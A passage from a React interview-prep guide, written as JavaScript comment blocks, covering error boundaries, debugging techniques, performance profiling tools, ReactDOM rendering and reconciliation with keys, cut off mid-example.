    route: window.location.href,
    timestamp: Date.now()
  });
}

// 4. Use separate error boundaries for different sections
<ErrorBoundary name="Header">
  <Header />
</ErrorBoundary>

<ErrorBoundary name="Main Content">
  <MainContent />
</ErrorBoundary>

Summary:

componentDidCatch:
- Lifecycle method for error handling
- Called after error in descendant
- Receives error and errorInfo
- Use for logging/side effects
- Called in commit phase
- Can't be used to update state (use getDerivedStateFromError)
- Pair with getDerivedStateFromError
- Only in class components
- Essential for error monitoring
- Doesn't catch event handler/async errors
*/


/**
75. How do you debug React applications?
----------------------------------------

Debugging React applications involves multiple tools and techniques. Here's a
comprehensive guide to debugging React apps effectively.

1. React Developer Tools (Browser Extension):
----------------------------------------------

// Install: Chrome/Firefox extension "React Developer Tools"

// Features:
// - Inspect component tree
// - View component props and state
// - Track component updates
// - Profile performance
// - View hooks

// Using React DevTools:

// a) Components Tab
// - See component hierarchy
// - Select component to inspect
// - View props, state, hooks
// - Edit props/state in real-time
// - Search components

// b) Profiler Tab
// - Record performance
// - See which components rendered
// - Identify expensive renders
// - Flamegraph visualization

// Example: Finding why component re-renders
function MyComponent({ user, settings }) {
  console.log('MyComponent rendered');
  
  return (
    <div>
      <p>{user.name}</p>
      <p>{settings.theme}</p>
    </div>
  );
}

// In React DevTools:
// 1. Select component
// 2. Click "Why did this render?"
// 3. Shows: props changed (user.name changed from "John" to "Jane")

2. Console.log Debugging:
--------------------------

// Strategic console.log placement

function Component({ data }) {
  console.log('Component rendered with data:', data);
  
  useEffect(() => {
    console.log('Effect ran, data:', data);
    return () => {
      console.log('Cleanup ran');
    };
  }, [data]);
  
  const handleClick = () => {
    console.log('Button clicked');
  };
  
  return <button onClick={handleClick}>Click</button>;
}

// Better: Custom debug hook
function useDebugValue(label, value) {
  useEffect(() => {
    console.log(`[${label}] Changed:`, value);
  }, [label, value]);
}

// Usage
function Component({ user }) {
  useDebugValue('user', user);
  return <div>{user.name}</div>;
}

3. Browser Debugger:
--------------------

// Use debugger statement

function Component({ data }) {
  // Execution pauses here when this line runs
  debugger;
  
  const processedData = processData(data);
  
  if (processedData.length === 0) {
    debugger; // Conditional breakpoint
  }
  
  return <div>{processedData}</div>;
}

// Or set breakpoints in browser DevTools:
// 1. Open Sources tab
// 2. Find your file
// 3. Click line number to add breakpoint
// 4. Interact with app
// 5. Execution pauses at breakpoint

4. Custom Debug Components:
----------------------------

// Create debug components to log data

function DebugProps({ data }) {
  return (
    <div style={{ background: '#f0f0f0', padding: '10px', margin: '10px' }}>
      <h3>Debug Info:</h3>
      <pre>{JSON.stringify(data, null, 2)}</pre>
    </div>
  );
}

// Usage
function MyComponent({ user, settings }) {
  return (
    <div>
      {process.env.NODE_ENV === 'development' && (
        <DebugProps data={{ user, settings }} />
      )}
      {/* Rest of component * /}
    </div>
  );
}

// Debug component tree
function DebugTree({ children }) {
  const [expanded, setExpanded] = useState(false);
  
  return (
    <div>
      <button onClick={() => setExpanded(!expanded)}>
        {expanded ? 'Hide' : 'Show'} Debug Info
      </button>
      {expanded && (
        <pre>{JSON.stringify(children, null, 2)}</pre>
      )}
      {children}
    </div>
  );
}

5. useDebugValue Hook:
-----------------------

// Add debug info to custom hooks (shows in React DevTools)

function useOnlineStatus() {
  const [isOnline, setIsOnline] = useState(navigator.onLine);
  
  useEffect(() => {
    function handleOnline() {
      setIsOnline(true);
    }
    function handleOffline() {
      setIsOnline(false);
    }
    
    window.addEventListener('online', handleOnline);
    window.addEventListener('offline', handleOffline);
    
    return () => {
      window.removeEventListener('online', handleOnline);
      window.removeEventListener('offline', handleOffline);
    };
  }, []);
  
  // Shows in React DevTools under hooks
  useDebugValue(isOnline ? 'Online' : 'Offline');
  
  return isOnline;
}

// Format debug value
function useDate() {
  const date = new Date();
  
  // Second argument formats the value
  useDebugValue(date, date => date.toLocaleDateString());
  
  return date;
}

6. Why Did You Render:
-----------------------

// Install: npm install @welldone-software/why-did-you-render

// In index.js (before imports)
import React from 'react';

if (process.env.NODE_ENV === 'development') {
  const whyDidYouRender = require('@welldone-software/why-did-you-render');
  whyDidYouRender(React, {
    trackAllPureComponents: true,
    logOnDifferentValues: true,
  });
}

// Flag components to track
function MyComponent({ user }) {
  return <div>{user.name}</div>;
}

MyComponent.whyDidYouRender = true;

// Console logs why component re-rendered:
// - Props changed
// - State changed
// - Parent re-rendered

7. Error Debugging:
-------------------

// Add error boundaries with detailed info

class DebugErrorBoundary extends React.Component {
  state = { hasError: false, error: null, errorInfo: null };
  
  static getDerivedStateFromError(error) {
    return { hasError: true, error };
  }
  
  componentDidCatch(error, errorInfo) {
    console.error('Error caught:', {
      error,
      errorInfo,
      props: this.props,
      state: this.state
    });
    
    this.setState({ errorInfo });
  }
  
  render() {
    if (this.state.hasError) {
      return (
        <div style={{ padding: '20px', background: '#ffebee' }}>
          <h1>Error Occurred</h1>
          <details>
            <summary>Error Details</summary>
            <p><strong>Message:</strong> {this.state.error?.message}</p>
            <pre><strong>Stack:</strong> {this.state.error?.stack}</pre>
            <pre><strong>Component Stack:</strong> {this.state.errorInfo?.componentStack}</pre>
          </details>
          <button onClick={() => this.setState({ hasError: false })}>
            Try Again
          </button>
        </div>
      );
    }
    
    return this.props.children;
  }
}

8. Network Debugging:
---------------------

// Monitor API calls

function useDebugFetch(url, options) {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  
  useEffect(() => {
    console.log(`[FETCH START] ${url}`, options);
    const startTime = Date.now();
    
    setLoading(true);
    
    fetch(url, options)
      .then(response => {
        console.log(`[FETCH SUCCESS] ${url} - ${Date.now() - startTime}ms`, response);
        return response.json();
      })
      .then(data => {
        console.log(`[FETCH DATA] ${url}`, data);
        setData(data);
      })
      .catch(error => {
        console.error(`[FETCH ERROR] ${url} - ${Date.now() - startTime}ms`, error);
        setError(error);
      })
      .finally(() => {
        setLoading(false);
      });
  }, [url, options]);
  
  return { data, loading, error };
}

9. Redux DevTools:
------------------

// If using Redux, install Redux DevTools extension

import { createStore } from 'redux';

const store = createStore(
  reducer,
  window.__REDUX_DEVTOOLS_EXTENSION__ && window.__REDUX_DEVTOOLS_EXTENSION__()
);

// Features:
// - See all actions
// - Time-travel debugging
// - Inspect state changes
// - Export/import state
// - Trace action sources

10. VS Code Debugging:
----------------------

// Create .vscode/launch.json

{
  "version": "0.2.0",
  "configurations": [
    {
      "type": "chrome",
      "request": "launch",
      "name": "Launch Chrome",
      "url": "http://localhost:3000",
      "webRoot": "${workspaceFolder}/src",
      "sourceMapPathOverrides": {
        "webpack:///src/*": "${webRoot}/*"
      }
    }
  ]
}

// Debug in VS Code:
// 1. Set breakpoints in editor
// 2. Press F5 to start debugging
// 3. Inspect variables
// 4. Step through code

11. Performance Debugging:
--------------------------

// Use React Profiler API

import { Profiler } from 'react';

function onRenderCallback(
  id,
  phase,
  actualDuration,
  baseDuration,
  startTime,
  commitTime,
  interactions
) {
  console.log(`${id} (${phase}) took ${actualDuration}ms`);
}

function App() {
  return (
    <Profiler id="App" onRender={onRenderCallback}>
      <Navigation />
      <Profiler id="Content" onRender={onRenderCallback}>
        <MainContent />
      </Profiler>
    </Profiler>
  );
}

12. Custom Debug Hooks:
------------------------

// Create utility hooks for debugging

function useTraceUpdate(props) {
  const prev = useRef(props);
  
  useEffect(() => {
    const changedProps = Object.entries(props).reduce((acc, [key, val]) => {
      if (prev.current[key] !== val) {
        acc[key] = {
          from: prev.current[key],
          to: val
        };
      }
      return acc;
    }, {});
    
    if (Object.keys(changedProps).length > 0) {
      console.log('Changed props:', changedProps);
    }
    
    prev.current = props;
  });
}

// Usage
function MyComponent(props) {
  useTraceUpdate(props);
  return <div>{props.value}</div>;
}

// Render count tracker
function useRenderCount(componentName) {
  const renders = useRef(0);
  
  useEffect(() => {
    renders.current += 1;
    console.log(`${componentName} rendered ${renders.current} times`);
  });
}

// Usage
function MyComponent() {
  useRenderCount('MyComponent');
  return <div>Content</div>;
}

Summary:

Debugging Tools:
- React DevTools (component inspection)
- Console.log (strategic logging)
- Browser debugger (breakpoints)
- useDebugValue (custom hooks)
- Why Did You Render (unnecessary re-renders)
- Error boundaries (error tracking)
- Network tab (API calls)
- Redux DevTools (state management)
- VS Code debugger (IDE debugging)
- React Profiler (performance)
- Custom debug hooks (utilities)
*/


/**
76. What tools can be used for profiling React performance?
-----------------------------------------------------------

Profiling helps identify performance bottlenecks in React applications. Here are
the main tools and techniques for measuring and optimizing performance.

1. React DevTools Profiler:
----------------------------

// Built into React DevTools browser extension

// How to use:
// 1. Open React DevTools
// 2. Click "Profiler" tab
// 3. Click record button (circle)
// 4. Interact with your app
// 5. Click stop button
// 6. Analyze results

// Profiler shows:
// - Flamegraph: Visual representation of render times
// - Ranked chart: Components sorted by render time
// - Component chart: Individual component render timeline
// - Interactions: Track user interactions

// Reading the flamegraph:
// - Width = time spent rendering
// - Color = render duration (yellow = faster, green = average, blue = slower)
// - Height = component depth in tree
// - Click component for details

// Example: Identifying slow component
function App() {
  return (
    <div>
      <FastComponent />      {/* Thin bar * /}
      <SlowComponent />      {/* Wide bar - PROBLEM! * /}
      <AnotherFast />        {/* Thin bar * /}
    </div>
  );
}

// In Profiler, SlowComponent shows:
// - Render duration: 500ms
// - Why rendered: Props changed (data)
// - Render count: 10 times
// -> Need to optimize!

2. React Profiler API:
-----------------------

// Programmatic performance measurement

import { Profiler } from 'react';

function onRenderCallback(
  id,                    // Component id
  phase,                 // "mount" or "update"
  actualDuration,        // Time spent rendering
  baseDuration,          // Estimated time without memoization
  startTime,             // When React began rendering
  commitTime,            // When React committed update
  interactions           // Set of interactions
) {
  console.log(`${id} (${phase})`);
  console.log(`Actual duration: ${actualDuration}ms`);
  console.log(`Base duration: ${baseDuration}ms`);
  
  // Log to analytics
  if (actualDuration > 16) { // > 1 frame (60fps)
    logSlowRender({ id, phase, actualDuration });
  }
}

function App() {
  return (
    <Profiler id="App" onRender={onRenderCallback}>
      <Navigation />
      <MainContent />
    </Profiler>
  );
}

// Nested profilers for granular tracking
function Dashboard() {
  return (
    <Profiler id="Dashboard" onRender={onRenderCallback}>
      <Header />
      
      <Profiler id="UserSection" onRender={onRenderCallback}>
        <UserProfile />
        <UserSettings />
      </Profiler>
      
      <Profiler id="DataSection" onRender={onRenderCallback}>
        <DataTable />
        <Charts />
      </Profiler>
    </Profiler>
  );
}

3. Chrome DevTools Performance:
--------------------------------

// Browser-level performance profiling

// How to use:
// 1. Open Chrome DevTools
// 2. Go to "Performance" tab
// 3. Click record button
// 4. Interact with app
// 5. Click stop
// 6. Analyze flame chart

// What it shows:
// - JavaScript execution time
// - Rendering/painting
// - Network requests
// - Long tasks (>50ms)
// - Frame rate (FPS)
// - Memory usage

// Look for:
// - Red indicators (long tasks blocking main thread)
// - Dropped frames (stuttering)
// - Expensive JavaScript functions
// - Layout thrashing

// Example findings:
// Function             | Time    | Impact
// ---------------------|---------|--------
// ExpensiveSort        | 200ms   | HIGH - blocks UI
// RenderList           | 50ms    | MEDIUM
// HandleClick          | 5ms     | LOW

4. Lighthouse:
--------------

// Automated performance audit

// How to use:
// 1. Open Chrome DevTools
// 2. Go to "Lighthouse" tab
// 3. Select "Performance"
// 4. Click "Generate report"

// Metrics measured:
// - First Contentful Paint (FCP)
// - Largest Contentful Paint (LCP)
// - Time to Interactive (TTI)
// - Total Blocking Time (TBT)
// - Cumulative Layout Shift (CLS)

// Example report:
// Performance Score: 78/100
// FCP: 1.2s (Good)
// LCP: 2.5s (Needs Improvement)
// TTI: 3.8s (Poor) <- OPTIMIZE THIS
// TBT: 300ms (Needs Improvement)
// CLS: 0.1 (Good)

// Opportunities:
// 1. Remove unused JavaScript (-500ms)
// 2. Reduce JavaScript execution time (-1.2s)
// 3. Minimize main thread work (-800ms)

5. React Profiler with Custom Logging:
---------------------------------------

// Track performance metrics over time

class PerformanceMonitor extends React.Component {
  measurements = [];
  
  onRender = (id, phase, actualDuration) => {
    // Store measurement
    this.measurements.push({
      id,
      phase,
      duration: actualDuration,
      timestamp: Date.now()
    });
    
    // Warn if slow
    if (actualDuration > 16) {
      console.warn(`Slow render: ${id} took ${actualDuration}ms`);
    }
    
    // Send to analytics every 10 renders
    if (this.measurements.length >= 10) {
      this.sendAnalytics();
    }
  };
  
  sendAnalytics = () => {
    const avgDuration = this.measurements.reduce((sum, m) => 
      sum + m.duration, 0
    ) / this.measurements.length;
    
    analytics.track('Performance', {
      avgRenderTime: avgDuration,
      slowRenders: this.measurements.filter(m => m.duration > 16).length
    });
    
    this.measurements = [];
  };
  
  render() {
    return (
      <Profiler id="App" onRender={this.onRender}>
        {this.props.children}
      </Profiler>
    );
  }
}

6. Why Did You Render:
-----------------------

// Detect unnecessary re-renders

import whyDidYouRender from '@welldone-software/why-did-you-render';

if (process.env.NODE_ENV === 'development') {
  whyDidYouRender(React, {
    trackAllPureComponents: true,
    trackHooks: true,
    trackExtraHooks: [[require('react-redux/lib'), 'useSelector']],
    logOnDifferentValues: true,
  });
}

// Flag components to track
function ExpensiveComponent({ data }) {
  return <div>{data.map(item => <Item key={item.id} {...item} />)}</div>;
}

ExpensiveComponent.whyDidYouRender = true;

// Console output:
// ExpensiveComponent re-rendered because of:
// - Props changed: data.length changed from 10 to 10
// - Same values, different reference!
// -> Need to memoize data

7. React Render Tracker:
-------------------------

// Custom hook to track renders

function useRenderTracker(componentName) {
  const renderCount = useRef(0);
  const lastRenderTime = useRef(Date.now());
  
  useEffect(() => {
    renderCount.current += 1;
    const now = Date.now();
    const timeSinceLastRender = now - lastRenderTime.current;
    
    console.log(`[${componentName}]`, {
      renderNumber: renderCount.current,
      timeSinceLastRender: `${timeSinceLastRender}ms`,
      timestamp: new Date(now).toISOString()
    });
    
    lastRenderTime.current = now;
  });
  
  return renderCount.current;
}

// Usage
function MyComponent(props) {
  const renderCount = useRenderTracker('MyComponent');
  
  return (
    <div>
      Render #{renderCount}
      {/* Component content * /}
    </div>
  );
}

8. Bundle Analyzer:
-------------------

// Analyze JavaScript bundle size

// Install: npm install --save-dev webpack-bundle-analyzer

// In webpack.config.js or CRA:
const BundleAnalyzerPlugin = require('webpack-bundle-analyzer').BundleAnalyzerPlugin;

module.exports = {
  plugins: [
    new BundleAnalyzerPlugin()
  ]
};

// For Create React App:
// npm install --save-dev source-map-explorer
// Add to package.json:
"scripts": {
  "analyze": "source-map-explorer 'build/static/js/*.js'"
}

// Run: npm run build && npm run analyze

// Shows:
// - Size of each module
// - Which libraries are largest
// - Duplicate dependencies
// - Opportunities for code splitting

9. Custom Performance Hook:
----------------------------

// Measure component render time

function usePerformance(componentName) {
  const startTime = useRef(performance.now());
  
  useEffect(() => {
    const endTime = performance.now();
    const duration = endTime - startTime.current;
    
    console.log(`${componentName} rendered in ${duration.toFixed(2)}ms`);
    
    // Track in analytics
    if (duration > 16) {
      analytics.track('Slow Render', {
        component: componentName,
        duration
      });
    }
    
    startTime.current = performance.now();
  });
}

// Usage
function ExpensiveComponent() {
  usePerformance('ExpensiveComponent');
  
  // Expensive operations
  const data = useMemo(() => expensiveCalculation(), []);
  
  return <div>{data}</div>;
}

10. Real User Monitoring (RUM):
--------------------------------

// Track performance in production

// Using Web Vitals
import { getCLS, getFID, getFCP, getLCP, getTTFB } from 'web-vitals';

function sendToAnalytics({ name, delta, id }) {
  analytics.track('Web Vital', {
    metric: name,
    value: delta,
    id
  });
}

// Track all metrics
getCLS(sendToAnalytics);
getFID(sendToAnalytics);
getFCP(sendToAnalytics);
getLCP(sendToAnalytics);
getTTFB(sendToAnalytics);

// Custom React metrics
function useReportRenderTime(componentName) {
  const renderStart = useRef(performance.now());
  
  useEffect(() => {
    const renderTime = performance.now() - renderStart.current;
    
    // Report to analytics
    analytics.track('Component Render', {
      component: componentName,
      duration: renderTime,
      url: window.location.pathname
    });
  }, [componentName]);
}

11. React DevTools Highlight Updates:
--------------------------------------

// Visual feedback for component updates

// In React DevTools:
// Settings (gear icon) -> "Highlight updates when components render"

// Components that render will flash with colored border:
// - Blue: Updated
// - Green: Mounted
// - Orange: Updated slowly
// - Red: Updated very slowly

// Use to spot:
// - Components updating too frequently
// - Entire tree re-rendering
// - Cascading updates

12. Performance Budget:
-----------------------

// Set performance budgets and monitor

const PERFORMANCE_BUDGETS = {
  renderTime: 16,        // 60fps
  componentMount: 100,   // 100ms
  dataFetch: 1000,       // 1s
  bundleSize: 200        // 200KB
};

function checkPerformanceBudget(metric, value) {
  const budget = PERFORMANCE_BUDGETS[metric];
  
  if (value > budget) {
    console.warn(`⚠️ Budget exceeded: ${metric}`);
    console.warn(`Budget: ${budget}, Actual: ${value}`);
    
    // Alert team
    if (process.env.NODE_ENV === 'production') {
      alertSlack({
        message: `Performance budget exceeded: ${metric}`,
        budget,
        actual: value
      });
    }
  }
}

// Use in Profiler
function onRender(id, phase, actualDuration) {
  checkPerformanceBudget('renderTime', actualDuration);
}

Summary:

Performance Profiling Tools:
1. React DevTools Profiler - Visual component rendering
2. React Profiler API - Programmatic measurement
3. Chrome DevTools Performance - Browser-level profiling
4. Lighthouse - Automated audits
5. Why Did You Render - Unnecessary re-renders
6. Bundle Analyzer - Code size analysis
7. Web Vitals - Real user metrics
8. Custom hooks - App-specific tracking
9. RUM tools - Production monitoring
10. Performance budgets - Set limits

Best Practices:
- Profile in production mode
- Test on slower devices
- Monitor real user metrics
- Set performance budgets
- Profile regularly
- Fix biggest issues first
- Measure before and after optimization
*/




/**
77. What is ReactDOM and how does rendering work?
------------------------------------------------

ReactDOM is the library that provides DOM-specific methods for rendering React
components to the web. It acts as the bridge between React (the core library)
and the browser DOM.

React vs ReactDOM:
------------------

// React: Core library (components, hooks, state)
import React from 'react';

const element = <h1>Hello</h1>; // JSX -> React.createElement()

// ReactDOM: Browser-specific rendering
import ReactDOM from 'react-dom/client';

ReactDOM.createRoot(document.getElementById('root')).render(element);

// Why separate?
// - React can target different platforms (web, mobile, VR)
// - ReactDOM targets browser/web
// - React Native targets mobile
// - React VR targets virtual reality

Main ReactDOM Methods:
-----------------------

// 1. createRoot (React 18+)
import { createRoot } from 'react-dom/client';

const root = createRoot(document.getElementById('root'));
root.render(<App />);

// Enables concurrent features
// - Automatic batching
// - Transitions
// - Suspense
// - Improved performance

// 2. render (Legacy - React 17 and below)
import ReactDOM from 'react-dom';

ReactDOM.render(<App />, document.getElementById('root'));

// Synchronous rendering
// No concurrent features
// Still works but deprecated

// 3. unmountComponentAtNode
const rootElement = document.getElementById('root');
ReactDOM.render(<App />, rootElement);

// Later...
ReactDOM.unmountComponentAtNode(rootElement);
// Removes component and cleans up event handlers

// 4. createPortal
import { createPortal } from 'react-dom';

function Modal({ children }) {
  return createPortal(
    children,
    document.getElementById('modal-root')
  );
}

// Renders children into different DOM node
// Useful for modals, tooltips, dropdowns

// 5. flushSync (React 18+)
import { flushSync } from 'react-dom';

function handleClick() {
  flushSync(() => {
    setCount(count + 1); // Updates immediately
  });
  // DOM updated synchronously here
  console.log(divRef.current.textContent); // Shows new count
}

How Rendering Works:
--------------------

// Step-by-step rendering process:

// 1. JSX Transformation
const element = <h1 className="title">Hello</h1>;

// Transforms to:
const element = React.createElement(
  'h1',
  { className: 'title' },
  'Hello'
);

// Creates React element (plain object):
{
  type: 'h1',
  props: {
    className: 'title',
    children: 'Hello'
  },
  key: null,
  ref: null
}

// 2. Create Root
const root = createRoot(document.getElementById('root'));

// Creates fiber root
// - Internal data structure
// - Manages component tree
// - Tracks updates

// 3. Initial Render
root.render(<App />);

// React creates virtual DOM tree:
<App>
  <Header>
    <h1>Title</h1>
    <Nav>
      <a>Home</a>
      <a>About</a>
    </Nav>
  </Header>
  <Content>
    <p>Content here</p>
  </Content>
</App>

// Converts to real DOM:
<div id="root">
  <div class="header">
    <h1>Title</h1>
    <nav>
      <a>Home</a>
      <a>About</a>
    </nav>
  </div>
  <div class="content">
    <p>Content here</p>
  </div>
</div>

// 4. Updates
function Counter() {
  const [count, setCount] = useState(0);
  
  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={() => setCount(count + 1)}>
        Increment
      </button>
    </div>
  );
}

// When button clicked:
// 1. setCount(count + 1) called
// 2. React schedules update
// 3. Re-renders Counter component
// 4. Creates new virtual DOM
// 5. Compares with previous virtual DOM (diffing)
// 6. Calculates minimal changes
// 7. Updates only changed DOM nodes

// Only <p> text content changes:
// Before: <p>Count: 0</p>
// After:  <p>Count: 1</p>
// React only updates text node, not entire <p> or <div>

Rendering Phases:
-----------------

// Phase 1: Render Phase (Can be paused/interrupted in React 18)
// - Call components
// - Calculate what changed
// - Build new virtual DOM tree
// - Diff with previous tree
// - Mark nodes for update
// - Pure, no side effects

// Phase 2: Commit Phase (Synchronous, cannot be interrupted)
// - Apply DOM updates
// - Run useLayoutEffect
// - Update refs
// - Run useEffect (after commit)
// - Browser paints screen

Example: Full Rendering Cycle
------------------------------

function App() {
  const [items, setItems] = useState(['Apple', 'Banana']);
  
  return (
    <div>
      <h1>Fruits</h1>
      <ul>
        {items.map(item => (
          <li key={item}>{item}</li>
        ))}
      </ul>
      <button onClick={() => setItems([...items, 'Orange'])}>
        Add Orange
      </button>
    </div>
  );
}

// Initial Render:
// 1. createRoot creates fiber root
// 2. render() called with <App />
// 3. App function executed
// 4. Virtual DOM created:
{
  type: 'div',
  props: {
    children: [
      { type: 'h1', props: { children: 'Fruits' } },
      { 
        type: 'ul',
        props: {
          children: [
            { type: 'li', key: 'Apple', props: { children: 'Apple' } },
            { type: 'li', key: 'Banana', props: { children: 'Banana' } }
          ]
        }
      },
      { type: 'button', props: { onClick: [Function], children: 'Add Orange' } }
    ]
  }
}
// 5. Real DOM created and inserted

// After clicking "Add Orange":
// 1. setItems called
// 2. App re-renders
// 3. New virtual DOM created (with Orange)
// 4. Diff algorithm compares:
//    - <h1> same ✓
//    - <ul> same ✓
//    - <li>Apple</li> same ✓
//    - <li>Banana</li> same ✓
//    - <li>Orange</li> NEW! +
//    - <button> same ✓
// 5. Only ONE DOM operation: append new <li>Orange</li> to <ul>
// 6. useEffect cleanup from previous render
// 7. New useEffect runs

Concurrent Rendering (React 18):
---------------------------------

// Old (Synchronous):
ReactDOM.render(<App />, root);
// Blocks main thread until complete
// Can cause janky UI

// New (Concurrent):
const root = createRoot(document.getElementById('root'));
root.render(<App />);

// Can pause/resume rendering
// Prioritizes urgent updates
// Keeps UI responsive

// Example: Urgent vs Non-urgent updates
import { startTransition } from 'react';

function SearchResults() {
  const [query, setQuery] = useState('');
  const [results, setResults] = useState([]);
  
  const handleChange = (e) => {
    // Urgent: Update input immediately
    setQuery(e.target.value);
    
    // Non-urgent: Update results (can be interrupted)
    startTransition(() => {
      const filtered = filterLargeDataset(e.target.value);
      setResults(filtered);
    });
  };
  
  return (
    <div>
      <input value={query} onChange={handleChange} />
      <ResultsList results={results} />
    </div>
  );
}

// User types "hello":
// h - Input updates, results start filtering
// e - Input updates immediately, previous filtering paused, new filtering starts
// l - Input updates immediately, previous filtering paused, new filtering starts
// l - Input updates immediately, previous filtering paused, new filtering starts
// o - Input updates immediately, previous filtering paused, new filtering starts
// (User stops typing)
// - Final filtering completes, results displayed
// Smooth typing experience!

Batching in ReactDOM:
---------------------

// React 18: Automatic batching everywhere

function Component() {
  const [count, setCount] = useState(0);
  const [flag, setFlag] = useState(false);
  
  // In event handler - batched
  const handleClick = () => {
    setCount(c => c + 1);
    setFlag(f => !f);
    // Single re-render
  };
  
  // In timeout - batched in React 18!
  const handleTimeout = () => {
    setTimeout(() => {
      setCount(c => c + 1);
      setFlag(f => !f);
      // Single re-render (batched in React 18)
    }, 1000);
  };
  
  // In promise - batched in React 18!
  const handlePromise = () => {
    fetch('/api').then(() => {
      setCount(c => c + 1);
      setFlag(f => !f);
      // Single re-render (batched in React 18)
    });
  };
  
  return (
    <div>
      <button onClick={handleClick}>Click</button>
      <button onClick={handleTimeout}>Timeout</button>
      <button onClick={handlePromise}>Promise</button>
    </div>
  );
}

Portals:
--------

// Render component outside parent hierarchy

// HTML:
<div id="root"></div>
<div id="modal-root"></div>

// Component:
function Modal({ isOpen, children }) {
  if (!isOpen) return null;
  
  // Renders into #modal-root, not #root
  return createPortal(
    <div className="modal">
      <div className="modal-content">
        {children}
      </div>
    </div>,
    document.getElementById('modal-root')
  );
}

function App() {
  const [showModal, setShowModal] = useState(false);
  
  return (
    <div>
      <button onClick={() => setShowModal(true)}>
        Open Modal
      </button>
      
      {/* Rendered outside this div * /}
      <Modal isOpen={showModal}>
        <h2>Modal Content</h2>
      </Modal>
    </div>
  );
}

// Events still bubble through React tree
// Even though Modal is in different DOM location

Summary:

ReactDOM:
- Bridge between React and browser DOM
- createRoot for React 18 (concurrent features)
- render for legacy (synchronous)
- createPortal for rendering outside hierarchy
- Handles initial render and updates
- Two phases: render and commit
- Automatic batching in React 18
- Enables concurrent rendering
- Minimal DOM manipulation through diffing
*/


/**
78. What is reconciliation in React?
------------------------------------

Reconciliation is the algorithm React uses to update the DOM efficiently by
comparing the new virtual DOM tree with the previous one and determining the
minimal set of changes needed.

Core Concept:
-------------

// When state/props change:
// 1. React creates new virtual DOM tree
// 2. Compares with previous virtual DOM tree (reconciliation)
// 3. Calculates differences (diffing)
// 4. Updates real DOM with only the changes

// Example:
function Counter() {
  const [count, setCount] = useState(0);
  
  return (
    <div>
      <h1>Counter App</h1>
      <p>Count: {count}</p>
      <button onClick={() => setCount(count + 1)}>+</button>
    </div>
  );
}

// Initial render creates:
<div>
  <h1>Counter App</h1>
  <p>Count: 0</p>
  <button>+</button>
</div>

// After clicking button:
// New virtual DOM:
<div>
  <h1>Counter App</h1>
  <p>Count: 1</p>  ← Only this changed
  <button>+</button>
</div>

// Reconciliation:
// - Compares trees
// - Finds: <p> text changed from "Count: 0" to "Count: 1"
// - Updates: Only the text node inside <p>
// - Doesn't recreate entire DOM tree

Reconciliation Algorithm:
--------------------------

// React uses heuristics to make O(n) instead of O(n³):

// 1. Different element types -> replace entire tree
// Before:
<div>
  <Counter />
</div>

// After:
<span>
  <Counter />
</span>

// React destroys old <div> and Counter
// Creates new <span> and Counter from scratch
// Counter loses state (unmounted and remounted)

// 2. Same element type -> keep DOM node, update attributes
// Before:
<div className="before" title="old" />

// After:
<div className="after" title="new" />

// React keeps same DOM node
// Only updates className and title attributes

// 3. Same component type -> update props
// Before:
<Counter value={0} />

// After:
<Counter value={1} />

// React keeps Counter instance
// Calls componentDidUpdate or runs useEffect
// State preserved

// 4. Recurse on children
// Before:
<ul>
  <li>A</li>
  <li>B</li>
</ul>

// After:
<ul>
  <li>A</li>
  <li>B</li>
  <li>C</li>
</ul>

// React iterates children:
// - <li>A</li> same ✓
// - <li>B</li> same ✓
// - <li>C</li> new, insert +

Keys in Reconciliation:
-----------------------

// Without keys - inefficient
function List() {
  const [items, setItems] = useState(['A', 'B', 'C']);
  
  return (
    <ul>
      {items.map(item => <li>{item}</li>)}
    </ul>
  );
}

// Initial:
<ul>
  <li>A</li>
  <li>B</li>
  <li>C</li>
</ul>

// After inserting 'X' at start:
setItems(['X', 'A', 'B', 'C']);

// Without keys, React thinks:
<li>A</li> changed to <li>X</li> ← Update
<li>B</li> changed to <li>A</li> ← Update
<li>C</li> changed to <li>B</li> ← Update
NEW: <li>C</li> ← Insert
// 4 operations!

// With keys - efficient
function List() {
  const [items, setItems] = useState(['A', 'B', 'C']);
  
  return (
    <ul>
      {items.map(item => <li key={item}>{item}</li>)}
    </ul>
  );
}

// Initial:
<ul>
  <li key="A">A</li>
  <li key="B">B</li>
  <li key="C">C</li>
</ul>

// After inserting 'X' at start:
setItems(['X', 'A', 'B', 'C']);

// With keys, React knows:
<li key="A">A</li> ← Same, keep ✓
<li key="B">B</li> ← Same, keep ✓
<li key="C">C</li> ← Same, keep ✓
NEW: <li key="X">X</li> ← Insert at start
// 1 operation!

Reconciliation Examples:
------------------------

// Example 1: Element type changed
function App() {
  const [useDiv, setUseDiv] = useState(true);
  
  return useDiv ? (
    <div>
      <Counter /> {/* Counter with state * /}
    </div>
  ) : (
    <span>
      <Counter /> {/* New Counter, state lost! * /}
    </span>
  );
}

// Toggling destroys and recreates Counter
// State is lost

// Solution: Keep same element type
function App() {
  const [className, setClassName] = useState('div-style');
  
  return (
    <div className={className}>
      <Counter /> {/* Counter kept, state preserved * /}
    </div>
  );
}

// Example 2: Conditional rendering
function App() {
  const [showA, setShowA] = useState(true);
  
  return (
    <div>
      {showA ? <ComponentA /> : <ComponentB />}
    </div>
  );
}

// Toggling destroys ComponentA and creates ComponentB
// Each loses state when hidden

// Solution: Render both, hide with CSS
function App() {
  const [showA, setShowA] = useState(true);
  
  return (
    <div>
      <ComponentA style={{ display: showA ? 'block' : 'none' }} />
      <ComponentB style={{ display: !showA ? 'block' : 'none' }} />
    </div>
  );
}

// Both stay mounted, state preserved

// Example 3: List reordering
const items = [
  { id: 1, name: 'Apple' },
  { id: 2, name: 'Banana' },
  { id: 3, name: 'Cherry' }
];

// ❌ Bad: Using index as key
function BadList() {
  return (
    <ul>
      {items.map((item, index) => (
        <li key={index}>{item.name}</li>
      ))}
    </ul>
  );
}

// After sorting: ['Banana', 'Apple', 'Cherry']
// React thinks items changed positions:
// Index 0: "Apple" -> "Banana" (Update)
// Index 1: "Banana" -> "Apple" (Update)
// Index 2: "Cherry" -> "Cherry" (Keep)
// Wrong! Unnecessary updates

// ✅ Good: Using stable ID as key
function GoodList() {
  return (
    <ul>
      {items.map(item => (
        <li key={item.id}>{item.name}</li>
      ))}
    </ul>
  );
}

// After sorting:
// Key 1: "Apple" - moved position but same element ✓
// Key 2: "Banana" - moved position but same element ✓
// Key 3: "Cherry" - same position ✓
// Correct! Just reorder DOM nodes

Reconciliation with State:
---------------------------

class Counter extends React.Component {
  state = { count: 0 };
  
  increment = () => {
